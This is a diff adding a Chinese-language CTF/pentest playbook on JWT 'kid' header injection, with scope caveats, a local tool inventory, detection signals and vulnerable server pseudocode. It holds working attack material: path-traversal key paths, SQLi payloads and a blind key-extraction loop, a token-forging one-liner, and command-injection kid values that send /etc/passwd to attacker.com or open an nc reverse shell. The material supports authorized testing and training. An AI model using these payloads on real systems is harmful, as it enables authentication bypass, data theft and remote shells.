@@ -1,0 +1,387 @@
+# JWT `kid` 参数注入
+
+> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/02-auth/jwt/04-kid-injection.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
+> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
+> **什么时候用**：命中「kid / Key ID / 路径穿越 / SQL注入」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。
+
+## 适用信号
+
+- kid
+- Key ID
+- 路径穿越
+- SQL注入
+- 命令注入
+- kid injection
+- jwt_tool
+- JWT
+
+## 前置
+
+- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
+- 工具定位走探测层，别猜路径：
+
+```powershell
+. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
+$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
+& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
+```
+
+- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
+- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
+- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：
+
+| 工具 | 本机状态 | 本机命令 / 替代方案 |
+|---|---|---|
+| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
+| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
+| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
+| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
+| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
+| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
+| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
+| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
+| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
+| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
+| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
+| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
+| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
+| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
+| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
+| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
+| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
+| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
+| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
+| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
+| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
+| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
+| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
+| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |
+
+- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
+  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。
+
+
+## 步骤
+
+1. **检测信号** — Header 包含 `kid` 字段
+2. **检测信号** — 修改 `kid` 值后错误信息发生变化（"key not found" / "invalid key" / 文件系统错误）
+3. **检测信号** — 错误信息暴露路径结构（`/etc/jwt_keys/xxx.pem not found`）
+4. **检测信号** — 修改 `kid` 后响应时间变化（SQL 时间盲注信号）
+
+## 判据
+
+判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。
+
+- **输入信号** — Header 包含 `kid`，且修改后错误消息、响应时间或状态码发生变化
+- **输入信号** — 错误中出现 key path、SQL、keystore、JWK cache、文件名或 `key not found`
+- **输入信号** — `kid` 为文件名、UUID、数字 ID、URL、SQL 主键或租户 ID
+- **输入信号** — 同一 token 改 payload 必失败，但改 `kid` 会进入不同错误分支
+- **Evidence** — `kid_oracle_matrix.csv`: kid、alg、签名 key、状态码、错误片段、响应时间、body hash。
+- **Evidence** — `kid_payloads.json`: 路径穿越、SQLi、命令注入、URL fetch、tenant switch 的 payload 与结果。
+- **Evidence** — 成功样本: 可控 kid 让服务端使用空 key/攻击者 secret/外部 key，伪造 token 被业务接口接受。
+- **Evidence** — 失败样本: 任意 kid 都同一 `key not found`、路径归一化、SQL 参数化、外部 URL 不被请求。
+- **Evidence** — 下一跳: SQLi 命中转数据库板块；URL fetch 命中转 SSRF/JKU；拿到 secret 后转弱密钥伪造流程。
+
+## 坑
+
+- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
+- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
+- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。
+
+## 相关
+
+- 见本技能 `../../SKILL.md` 的 references 索引。
+
+## 技术正文
+
+> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。
+
+## 输入信号
+
+- Header 包含 `kid`，且修改后错误消息、响应时间或状态码发生变化
+- 错误中出现 key path、SQL、keystore、JWK cache、文件名或 `key not found`
+- `kid` 为文件名、UUID、数字 ID、URL、SQL 主键或租户 ID
+- 同一 token 改 payload 必失败，但改 `kid` 会进入不同错误分支
+
+## 0. kid 路由矩阵
+
+| kid 形态 | 服务端可能动作 | Payload 方向 | 命中样本 |
+|----------|----------------|--------------|----------|
+| `key-001.pem` | 文件读取 | `../../dev/null`, `%2e%2e/` | 文件错误变化 |
+| 数字/UUID | SQL 查 key | `' UNION SELECT 'secret'--` | 可控 secret 通过 |
+| URL/路径 | 远程 keystore | `http://host/jwks` | 外连日志 |
+| 命令参数 | shell/curl | `;id;#`, `$(id)` | 命令输出/延迟 |
+| 租户 ID | 多租户 key | 换其他 tenant | 跨租户 token 接受 |
+
+## 0.1 kid oracle
+
+| 探针 | 观察 | 结论 |
+|------|------|------|
+| 随机 kid | `key not found` | kid 被查询 |
+| 超长 kid | 500/截断 | DB/日志/文件路径参与 |
+| `../../dev/null` | 签名错误变 key 长度错误 | 文件路径参与 |
+| `'` | SQL syntax | SQL 参与 |
+| `http://127.0.0.1` | 延迟/外连 | URL fetch 参与 |
+
+## 原理
+
+`kid`（Key ID）是 Header 中的可选字段，告诉服务端用哪个密钥验证签名。如果服务端将 `kid` 的值**未经净化**直接用于文件路径、SQL 查询或系统命令，就产生了注入点。
+
+```
+┌──────────────────────────────────────────────────────────┐
+│ kid 的三种典型服务端使用方式                               │
+│                                                           │
+│  1. 文件路径:  /etc/jwt_keys/<kid>.pem                    │
+│     → 路径穿越 → 读取 /dev/null 或其他可预测文件作为密钥    │
+│                                                           │
+│  2. SQL 查询:   SELECT key FROM keys WHERE kid='<kid>'    │
+│     → SQL 注入 → 控制返回的密钥值                          │
+│                                                           │
+│  3. 系统命令:   curl https://keystore/<kid>               │
+│     → 命令注入 → 执行任意命令                              │
+└──────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 3.1 路径穿越
+
+### 漏洞场景
+
+```python
+# 服务端漏洞代码（伪代码）
+def get_key_by_kid(kid: str) -> bytes:
+    # BUG: 直接拼接路径，未净化 kid
+    key_path = f"/etc/jwt_keys/{kid}.pem"
+    return open(key_path, 'rb').read()
+
+def verify_token(token: str):
+    header = decode_header(token)
+    key = get_key_by_kid(header['kid'])
+    return jwt_verify(token, key)
+```
+
+### 攻击伪代码
+
+```python
+# attack_kid_path_traversal.py
+
+def forge_with_kid_path_traversal(
+    original_token: str,
+    target_file: str,      # 要读取的文件路径（相对路径）
+    algorithm: str = 'HS256'
+) -> str:
+    """
+    利用 kid 路径穿越伪造 JWT
+
+    假设服务端拼装路径: /etc/jwt_keys/<kid>.pem
+    如果 kid = "../../dev/null"
+    实际路径 → /etc/jwt_keys/../../dev/null.pem → /dev/null.pem
+    服务端读取 /dev/null 的内容（空）作为 HMAC 密钥
+
+    Args:
+        original_token: 原始合法 token（用于观察结构）
+        target_file:    穿越目标，如 "../../dev/null"
+        algorithm:      签名算法
+    Returns:
+        伪造后的 JWT
+    """
+    # 根据目标文件的内容确定密钥
+    # /dev/null    → 密钥 = b""
+    # /proc/sys/kernel/random/boot_id → 密钥 = UUID 字符串
+    # ../../etc/passwd → 大概率不匹配（需先读内容）
+
+    key = b""  # /dev/null 的内容为空
+
+    header = {"alg": algorithm, "typ": "JWT", "kid": target_file}
+    payload = {"sub": "admin", "role": "admin"}
+
+    return sign_jwt(header, payload, key, algorithm)
+
+
+def probe_target_file(kid_path: str, target_url: str) -> bool:
+    """
+    探测目标文件是否存在/可读
+    通过服务端响应判断
+    """
+    header_b64 = b64url({"alg": "HS256", "typ": "JWT", "kid": kid_path})
+    payload_b64 = b64url({"sub": "test"})
+    # 用空密钥签名（假设 /dev/null）
+    sig = hmac_sha256(f"{header_b64}.{payload_b64}", b"")
+    token = f"{header_b64}.{payload_b64}.{sig}"
+
+    resp = requests.get(target_url, headers={"Authorization": f"Bearer {token}"})
+
+    # 不同文件 → 不同错误
+    if "FileNotFound" in resp.text:
+        return False            # 文件不存在
+    if "key too short" in resp.text:
+        return True             # 文件存在但内容不够长
+    if "signature" in resp.text.lower():
+        return True             # 文件存在但签名不匹配
+    if resp.status_code == 200:
+        return True             # 签名匹配！完美
+    return None                 # 不确定
+```
+
+### 常用穿越 Payload
+
+```text
+# 空密钥
+../../dev/null              → /dev/null → key = b""
+
+# 已知内容的系统文件
+../../../proc/sys/kernel/random/boot_id  → UUID → 可预测
+../../../sys/class/dmi/id/product_uuid   → 可预测
+
+# 配置文件（需先读内容再签名）
+../../../etc/hostname       → 可能是短字符串
+../../../proc/self/environ  → 环境变量
+../../../var/log/app.log   → 日志中的某行
+
+# 尝试读取 Web 源码中的硬编码密钥
+../../../var/www/html/config.php
+../../../app/config.py
+../../../.env
+```
+
+---
+
+## 3.2 SQL 注入
+
+### 漏洞场景
+
+```python
+# 服务端漏洞代码
+def get_key_by_kid(kid: str) -> str:
+    query = f"SELECT secret_key FROM jwt_keys WHERE kid = '{kid}'"
+    cursor.execute(query)
+    row = cursor.fetchone()
+    return row[0] if row else None
+```
+
+### 攻击伪代码
+
+```python
+# attack_kid_sqli.py
+
+def forge_with_kid_sqli(
+    sqli_payload: str,     # SQL 注入 payload
+    controlled_key: str,   # 攻击者控制的密钥值
+) -> str:
+    """
+    通过 kid SQL 注入让服务端返回攻击者控制的密钥
+
+    原始 SQL:  SELECT key FROM jwt_keys WHERE kid = '<kid>'
+    注入后:    SELECT key FROM jwt_keys WHERE kid = 'x' UNION SELECT 'attacker_key' --'
+               → 返回 'attacker_key'
+
+    然后用 'attacker_key' 作为 HMAC 密钥签名
+    """
+    header = {
+        "alg": "HS256",
+        "typ": "JWT",
+        "kid": sqli_payload      # 如: x' UNION SELECT 'mysecret' --
+    }
+    payload = {"sub": "admin", "role": "admin"}
+    return sign_jwt(header, payload, controlled_key.encode(), 'HS256')
+
+
+# --- Payload 变种 ---
+SQLI_PAYLOADS = [
+    # 基础 UNION
+    "x' UNION SELECT 'mykey' --",
+    "x' UNION SELECT 'mykey' #",
+    # 子查询
+    "x' UNION SELECT (SELECT password FROM users LIMIT 1) --",
+    # 堆叠查询 (如果支持)
+    "x'; INSERT INTO jwt_keys VALUES ('attacker', 'mykey'); --",
+    # 时间盲注探测
+    "x' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --",
+    # 布尔盲注
+    "x' AND SUBSTRING((SELECT secret_key FROM jwt_keys LIMIT 1),1,1)='a' --",
+]
+```
+
+### SQLi 盲注提取真实密钥
+
+```python
+def blind_extract_key(target_url, original_token):
+    """
+    通过 kid SQLi 布尔盲注逐字符提取真实密钥
+    """
+    known_key = ""
+    for pos in range(1, 33):  # 假设密钥最长 32 字符
+        for ch in "abcdefghijklmnopqrstuvwxyz0123456789_-":
+            # 注入 payload：提取数据库中的密钥第 pos 个字符
+            kid = (
+                f"x' AND SUBSTRING("
+                f"(SELECT secret_key FROM jwt_keys LIMIT 1),"
+                f"{pos},1)='{ch}' --"
+            )
+
+            header = {"alg": "HS256", "kid": kid}
+            # 用 ch 临时签名...
+            # 若 200 → 字符匹配，known_key += ch
+            # 若 401 → 字符不匹配
+```
+
+---
+
+## 3.3 命令注入
+
+### 漏洞场景
+
+```python
+# 服务端漏洞代码
+def get_key_by_kid(kid: str) -> bytes:
+    # BUG: kid 被拼接到 shell 命令中
+    result = subprocess.check_output(f"curl -s https://keystore.internal/jwt/{kid}")
+    return result
+```
+
+### 攻击 Payload
+
+```json
+{"alg": "HS256", "typ": "JWT", "kid": "x;curl http://attacker.com/$(cat /etc/passwd|base64);"}
+{"alg": "HS256", "typ": "JWT", "kid": "$(id>/tmp/pwned)"}
+{"alg": "HS256", "typ": "JWT", "kid": "`nc attacker.com 4444 -e /bin/bash`"}
+```
+
+---
+
+## 检测信号
+
+- Header 包含 `kid` 字段
+- 修改 `kid` 值后错误信息发生变化（"key not found" / "invalid key" / 文件系统错误）
+- 错误信息暴露路径结构（`/etc/jwt_keys/xxx.pem not found`）
+- 修改 `kid` 后响应时间变化（SQL 时间盲注信号）
+
+## 工具命令
+
+```bash
+# jwt_tool kid 注入扫描
+python3 jwt_tool.py <token> -X i -pk attacker.pem
+
+# 手动探测路径穿越
+python3 -c "
+import base64,json,hmac,hashlib
+h=base64.urlsafe_b64encode(json.dumps({'alg':'HS256','kid':'../../dev/null'}).encode()).rstrip(b'=').decode()
+p=base64.urlsafe_b64encode(json.dumps({'sub':'admin'}).encode()).rstrip(b'=').decode()
+s=base64.urlsafe_b64encode(hmac.new(b'',f'{h}.{p}'.encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
+print(f'{h}.{p}.{s}')
+"
+```
+
+## 工作流
+
+捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。
+
+
+## Evidence
+
+- `kid_oracle_matrix.csv`: kid、alg、签名 key、状态码、错误片段、响应时间、body hash。
+- `kid_payloads.json`: 路径穿越、SQLi、命令注入、URL fetch、tenant switch 的 payload 与结果。
+- 成功样本: 可控 kid 让服务端使用空 key/攻击者 secret/外部 key，伪造 token 被业务接口接受。
+- 失败样本: 任意 kid 都同一 `key not found`、路径归一化、SQL 参数化、外部 URL 不被请求。
+- 下一跳: SQLi 命中转数据库板块；URL fetch 命中转 SSRF/JKU；拿到 secret 后转弱密钥伪造流程。
